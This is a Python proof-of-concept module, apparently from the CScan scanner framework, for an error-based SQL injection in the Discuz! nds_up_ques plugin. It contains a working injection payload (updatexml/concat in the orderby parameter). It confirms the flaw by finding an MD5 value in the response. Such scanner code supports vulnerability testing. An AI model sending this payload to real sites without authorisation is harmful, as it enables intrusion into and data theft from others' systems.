# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'Discuz_0003'  # 平台漏洞编号，留空
    name = 'Discuz! SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-06-04'  # 漏洞公布时间
    desc = '''
        Discuz plugin sql injection vulnerability.
    '''  # 漏洞描述
    ref = 'http://www.5kik.com/php0day/239.html'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = 'Discuz!'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '5ae2c103-fd61-4ed8-8650-5d0963ac7fa0'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-04'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = ('/plugin.php?id=nds_up_ques:nds_ques_viewanswer&srchtxt=1&orderby=dateline'
                       ' and 1=(updatexml(1,concat(0x27,md5(123)),1))--')
            verify_url = self.target + payload
            req = requests.get(verify_url)
            if '202cb962ac59075b964b07152d234b70' in req.content:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
